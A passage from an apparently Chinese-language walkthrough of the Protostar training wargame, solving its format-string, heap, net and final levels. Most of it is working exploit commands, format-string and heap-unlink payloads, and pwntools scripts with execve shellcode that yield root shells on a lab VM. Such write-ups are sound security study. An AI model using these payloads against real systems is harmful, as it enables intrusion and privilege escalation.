aaaa%0$08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.
$ .&#x2F;format1 `python -c &quot;print &#x27;\x38\x96\x04\x08%130\\\$08n.&#x27;&quot;`
8.you have modified the target :)
</code></pre>
<h1 id="format-2">Format 2</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
$ i=0; while [ $i -le 10 ]; do python -c &quot;print &#x27;aaaa%%%03d\$08x.&#x27; % $i&quot; | .&#x2F;format2 ; i=$((i+1)); done
aaaa%0$08x.
target is 0 :(
aaaa00000200.
target is 0 :(
aaaab7fd8420.
target is 0 :(
aaaabffffb14.
target is 0 :(
aaaa61616161.
target is 0 :(
aaaa35303025.
target is 0 :(
aaaa78383024.
target is 0 :(
aaaa00000a2e.
target is 0 :(
aaaab7fff524.
target is 0 :(
aaaabffffb70.
target is 0 :(
aaaab7fe35c9.
target is 0 :(
$ python -c &quot;print &#x27;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08x.&#x27;&quot; | .&#x2F;format2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.
target is 0 :(
$ python -c &quot;print &#x27;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08n.&#x27;&quot; | .&#x2F;format2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
you have modified the target :)
</code></pre>
<h1 id="format-3">Format 3</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
$ i=0; while [ $i -le 20 ]; do python -c &quot;print &#x27;aaaa%%%03d\$08x.&#x27; % $i&quot; | .&#x2F;format3 ; i=$((i+1)); done
aaaa%0$08x.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaabffffad0.
target is 00000000 :(
aaaab7fd7ff4.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaabffffcd8.
target is 00000000 :(
aaaa0804849d.
target is 00000000 :(
aaaabffffad0.
target is 00000000 :(
aaaa00000200.
target is 00000000 :(
aaaab7fd8420.
target is 00000000 :(
aaaabffffb14.
target is 00000000 :(
aaaa61616161.
target is 00000000 :(
aaaa33313025.
target is 00000000 :(
aaaa78383024.
target is 00000000 :(
aaaa00000a2e.
target is 00000000 :(
aaaab7fff524.
target is 00000000 :(
aaaabffffb70.
target is 00000000 :(
aaaab7fe35c9.
target is 00000000 :(
aaaa00000007.
target is 00000000 :(
aaaa00000010.
target is 00000000 :(
$ python -c &quot;print &#x27;\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.
target is 00000000 :(
$ python -c &quot;print &#x27;a%13\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
Segmentation fault
$ python -c &quot;print &#x27;a%13\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.
target is 00000000 :(
$ python -c &quot;print &#x27;a%14\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000000 :(
$ python -c &quot;print &#x27;a%14\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000000 :(
$ python -c &quot;print &#x27;a%14\$08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000100 :(
$ python -c &quot;print &#x27;a%16\$08na%17\$08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
target is 01000000 :(
$ python -c &quot;print &#x27;a%16\$08na%17\$08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
Segmentation fault
$ python -c &quot;print &#x27;a%16\$08na%17\$08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
target is 00020000 :(
$ python -c &quot;print &#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#x27;+&#x27;a&#x27;*(0x44-12)+&#x27;%12\$08x.&#x27;+&#x27;a&#x27;*(0x55-0x44)+&#x27;%13\$08x.&#x27;+&#x27;a&#x27;*(0x102-0x55)+&#x27;%14\$08x.&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.
target is 00000000 :(
$ python -c &quot;print &#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#x27;+&#x27;a&#x27;*(0x44-12)+&#x27;%12\$08x&#x27;+&#x27;a&#x27;*(0x55-0x44)+&#x27;%13\$08x&#x27;+&#x27;a&#x27;*(0x102-0x55)+&#x27;%14\$08x&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6
</code></pre>
<h2 id="solution-0-brute">solution 0: Brute!</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;\xf4\x96\x04\x08&#x27;+&#x27;%016930112d&#x27;+&#x27;%12\$08n&#x27;&quot; | .&#x2F;format3
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...
# 反正这里有很多很多很多零，我就好心删了它们
...0000000000000
you have modified the target :)
</code></pre>
<h2 id="solution-1-gentle">solution 1: Gentle</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#x27;+&#x27;a&#x27;*(0x44-12)+&#x27;%12\$08n&#x27;+&#x27;a&#x27;*(0x55-0x44)+&#x27;%13\$08n&#x27;+&#x27;a&#x27;*(0x102-0x55)+&#x27;%14\$08n&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have modified the target :)
</code></pre>
<h2 id="solution-2-more-gentle">solution 2: More gentle</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;a&#x27;+&#x27;%16\$hhn&#x27;+&#x27;a&#x27;+&#x27;%17\$hhn&#x27;+&#x27;\xf7\x96\x04\x08&#x27;+&#x27;\xf6\x96\x04\x08&#x27;+&#x27;\xf5\x96\x04\x08&#x27;+&#x27;\xf4\x96\x04\x08&#x27;+&#x27;a&#x27;*(0x44-2-16)+&#x27;%19\$hhn&#x27;+&#x27;a&#x27;*(0x55-0x44)+&#x27;%18\$hhn&#x27;&quot; | .&#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have modified the target :)
</code></pre>
<h1 id="format-4">Format 4</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ gdb -q format4
Reading symbols from &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;format4...done.
(gdb) disas hello
Dump of assembler code for function hello:
0x080484b4 &lt;hello+0&gt;:   push   %ebp
0x080484b5 &lt;hello+1&gt;:   mov    %esp,%ebp
0x080484b7 &lt;hello+3&gt;:   sub    $0x18,%esp
0x080484ba &lt;hello+6&gt;:   movl   $0x80485f0,(%esp)
0x080484c1 &lt;hello+13&gt;:  call   0x80483dc &lt;puts@plt&gt;
0x080484c6 &lt;hello+18&gt;:  movl   $0x1,(%esp)
0x080484cd &lt;hello+25&gt;:  call   0x80483bc &lt;_exit@plt&gt;
End of assembler dump.
(gdb) quit
$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit

$ objdump -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
$ i=0; while [ $i -le 10 ]; do i=$((i+1)); python -c &quot;print &#x27;aaaa%%%03d\$08x&#x27; % $i&quot; | .&#x2F;format4; done
aaaa00000200
aaaab7fd8420
aaaabffffb14
aaaa61616161
aaaa35303025
aaaa78383024
aaaa0000000a
aaaab7fff524
aaaabffffb70
aaaab7fe35c9
aaaa00000007
(gdb) b *0x0804851a
Breakpoint 1 at 0x804851a: file format4&#x2F;format4.c, line 27.
(gdb) r
Starting program: &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;format4

Breakpoint 1, main (argc=1, argv=0xbffffd54) at format4&#x2F;format4.c:27
27      format4&#x2F;format4.c: No such file or directory.
        in format4&#x2F;format4.c
(gdb) p exit
$1 = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;
(gdb) quit

$ python -c &quot;print &#x27;\x24\x97\x04\x08&#x27;+&#x27;\x25\x97\x04\x08&#x27;+&#x27;\x26\x97\x04\x08&#x27;+&#x27;\x27\x97\x04\x08&#x27;+&#x27;%164x%4\$n&#x27;+&#x27;%208x%5\$n&#x27;+&#x27;%128x%6\$n&#x27;+&#x27;%260x%7\$n&#x27;&quot; | .&#x2F;format4
$%&amp;&#x27;                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb14                                                                                                                                                                                                                                                             8049724
code execution redirected! you win


</code></pre>
<h1 id="heap-0">Heap 0</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ objdump -t heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
$ .&#x2F;heap0 `python -c &quot;print &#x27;a&#x27;*72+&#x27;\x64\x84\x04\x08&#x27;&quot;`
data is at 0x804a008, fp is at 0x804a050
level passed
</code></pre>
<h1 id="heap-1">Heap 1</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ ltrace .&#x2F;heap1 1234 1234
__libc_start_main(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 &lt;unfinished ...&gt;
malloc(8)                                             = 0x0804a008
malloc(8)                                             = 0x0804a018
malloc(8)                                             = 0x0804a028
malloc(8)                                             = 0x0804a038
strcpy(0x0804a018, &quot;1234&quot;)                            = 0x0804a018
strcpy(0x0804a038, &quot;1234&quot;)                            = 0x0804a038
puts(&quot;and that&#x27;s a wrap folks!&quot;and that&#x27;s a wrap folks!
)                      = 25
+++ exited (status 25) +++
$ objdump -t heap1 | grep winner
08048494 g     F .text  00000025              winner
$ objdump -TR heap1 | grep puts
00000000      DF *UND*  00000000  GLIBC_2.0   puts
08049774 R_386_JUMP_SLOT   puts
$ .&#x2F;heap1 `python -c &quot;print &#x27;a&#x27;*20+&#x27;\x74\x97\x04\x08&#x27;&quot;` `python -c &quot;print &#x27;\x94\x84\x04\x08&#x27;&quot;`
and we have a winner @ 1532607490
</code></pre>
<h1 id="heap-2">Heap 2</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ .&#x2F;heap2
[ auth = (nil), service = (nil) ]
auth wang
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
serviceaaaaaaaaaaaaaaaaaaaaaaaaa
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;auth &#x27;+&#x27;a&#x27;*30;print &#x27;reset&#x27;;print &#x27;service&#x27;+&#x27;a&#x27;*33;print &#x27;login&#x27;&quot; | .&#x2F;heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
$ python -c &quot;print &#x27;auth &#x27;;print &#x27;service&#x27;+&#x27;a&#x27;*17;print &#x27;login&#x27;&quot; | .&#x2F;heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
</code></pre>
<h1 id="heap-3">Heap 3</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ ltrace .&#x2F;heap3 aaaa aaaa aaaa
__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096
sbrk(4096)                                             = 0x0804c000
sbrk(0)                                                = 0x0804d000
strcpy(0x0804c008, &quot;aaaa&quot;)                             = 0x0804c008
strcpy(0x0804c030, &quot;aaaa&quot;)                             = 0x0804c030
strcpy(0x0804c058, &quot;aaaa&quot;)                             = 0x0804c058
puts(&quot;dynamite failed?&quot;dynamite failed?
)           
$ ltrace -S .&#x2F;heap3 aaaa aaaa aaaa
SYS_brk(NULL)                                          = 0x0804c000
SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                    = 0
SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                    = 0
SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                    = 0
SYS_access(&quot;&#x2F;etc&#x2F;suid-debug&quot;, 00)                      = -2
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.nohwcap&quot;, 00)                   = -2
SYS_mmap2(0, 8192, 3, 34, -1)                          = 0xb7fe0000
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;, 04)                   = -2
SYS_open(&quot;&#x2F;etc&#x2F;ld.so.cache&quot;, 0, 00)                    = 3
SYS_fstat64(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3)  = 0
SYS_mmap2(0, 13796, 1, 2, 3)                           = 0xb7fdc000
SYS_close(3)                                           = 0
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.nohwcap&quot;, 00)                   = -2
SYS_open(&quot;&#x2F;lib&#x2F;libc.so.6&quot;, 0, 00)                      = 3
SYS_read(3, &quot;\177ELF\001\001\001&quot;, 512)                = 512
SYS_fstat64(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) = 0
SYS_mmap2(0, 0x144948, 5, 2050, 3)                     = 0xb7e97000
SYS_mprotect(0xb7fd5000, 4096, 0)                      = 0
SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)               = 0xb7fd6000
SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)                = 0xb7fd9000
SYS_close(3)                                           = 0
SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7e96000
SYS_set_thread_area(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0
SYS_mprotect(0xb7fd6000, 8192, 1)                      = 0
SYS_mprotect(0xb7ffe000, 4096, 1)                      = 0
SYS_munmap(0xb7fdc000, 13796)                          = 0
__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096
sbrk(4096 &lt;unfinished ...&gt;
SYS_brk(NULL)                                          = 0x0804c000
SYS_brk(0x0804d000)                                    = 0x0804d000
&lt;... sbrk resumed&gt; )                                   = 0x0804c000
sbrk(0)                                                = 0x0804d000
strcpy(0x0804c008, &quot;aaaa&quot;)                             = 0x0804c008
strcpy(0x0804c030, &quot;aaaa&quot;)                             = 0x0804c030
strcpy(0x0804c058, &quot;aaaa&quot;)                             = 0x0804c058
puts(&quot;dynamite failed?&quot; &lt;unfinished ...&gt;
SYS_fstat64(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7fdf000
SYS_write(1, &quot;dynamite failed?\n&quot;, 17dynamite failed?
)                 = 17
&lt;... puts resumed&gt; )                                   = 17
SYS_exit_group(17 &lt;no return ...&gt;
+++ exited (status 17) +++
$ objdump -tTR heap3 | grep winner
08048864 g     F .text  00000025              winner
$ objdump -tTR heap3 | grep puts
00000000       F *UND*  00000000              puts@@GLIBC_2.0
00000000      DF *UND*  00000000  GLIBC_2.0   puts
0804b128 R_386_JUMP_SLOT   puts
$ .&#x2F;heap3 `python -c &#x27;print &quot;\x90&quot;*14 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*12 + &quot;\xf8\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;&#x27;` `python -c &#x27;print &quot;\xde\xad\xbe\xef&quot;*2+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;&#x27;` C
that wasn&#x27;t too bad now, was it? @ 1532745821
</code></pre>
<h2 id="xue-xi-zi-liao">学习资料</h2>
<p><a rel="noopener nofollow noreferrer" target="_blank" href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/">图解DWORDSHOOT</a></p>
<p><a rel="noopener nofollow noreferrer" target="_blank" href="http://turingh.github.io/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></p>
<h1 id="net-0">Net 0</h1>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *

r = remote(&quot;192.168.116.137&quot;, 2999)
s = r.recv()
pos = s.find(&quot;\&#x27;&quot;, 13)
num = int(s[13:pos])
r.sendline(p32(num))
print r.recv()
</code></pre>
<h1 id="net-1">Net 1</h1>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
import struct

r = remote(&quot;192.168.116.137&quot;, 2998)
s = r.recv()
# print s
num = struct.unpack(&quot;I&quot;, s)
# print num
r.sendline(str(num[0]))
print r.recv()
</code></pre>
<h1 id="net-2">Net 2</h1>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
import struct

r = remote(&quot;192.168.116.137&quot;, 2997)
num = 0
for i in range(0, 4):
  s = r.recv(4)
  num += int(struct.unpack(&quot;&lt;I&quot;, s)[0])
num &amp;= 0xffffffff
r.sendline(p32(num))
print r.recv()
</code></pre>
<h1 id="final-0">Final 0</h1>
<p>首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr</p>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
import struct

r = remote(&quot;192.168.116.137&quot;, 2995)
shellcode = &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;
payload = &#x27;\x00&#x27;+ shellcode + &#x27;\x90&#x27;*(532-len(shellcode)-1)+p32(0xbffffa49)
r.sendline(payload)
r.interactive()
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">root@kali:~&#x2F;Documents&#x2F;Protostar# python final0.py 
[+] Opening connection to 192.168.116.137 on port 2995: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<h1 id="final-1">Final 1</h1>
<p>syslog原型为<code>void syslog(int priority, const char *format, ...);</code>看第二个参数名字就懂了吧，查看需要在有权限的情况下看<code>/var/log/syslog</code>文件</p>
<p>然后就是尝试咯</p>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ objdump -tTR final1 | grep puts
00000000       F *UND*  00000000              puts@@GLIBC_2.0
00000000      DF *UND*  00000000  GLIBC_2.0   puts
0804a194 R_386_JUMP_SLOT   puts
$ objdump -tTR final1 | grep username
0804a220 g     O .bss   00000080              username
</code></pre>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
import struct

shellcode = &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;
ret = 0x0804a194
payload = shellcode+&#x27;\x90&#x27;*2+p32(ret)+p32(ret+1)+p32(ret+2)+p32(ret+3)+&#x27;%24$01968d&#x27;+&#x27;%26$hn&#x27;+&#x27;%24$039452d&#x27;+&#x27;%24$hn&#x27;
r = remote(&quot;192.168.116.137&quot;, 2994)
r.recv()
r.sendline(&quot;username &quot;+payload)
r.recv()
r.sendline(&quot;login &quot;+&quot; &quot;*24)
r.interactive()
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">root@kali:~&#x2F;Documents&#x2F;Protostar# python final1.py 
[+] Opening connection to 192.168.116.137 on port 2994: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)

</code></pre>
<h1 id="final-2">Final 2</h1>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
import struct

